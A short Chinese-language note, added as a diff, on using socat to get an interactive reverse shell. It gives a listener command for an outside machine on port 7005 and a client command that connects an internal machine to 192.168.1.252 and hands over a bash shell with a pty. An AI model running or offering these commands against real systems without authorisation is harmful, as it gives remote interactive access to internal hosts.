@@ -1,0 +1,9 @@
+反弹一个交互式的 Shell
+
+当有主机连接服务端的 7005 端口时，将会发送户端的 Shell 给服务端。
+
+服务端(外网机器)，可获取一个内网机器的shell
+  $ socat -,raw,echo=0 tcp-listen:7005
+
+客户端(内网机器)
+  $ socat tcp-connect:192.168.1.252:7005 exec:'bash -li',pty,stderr,setsid,sigint,sane
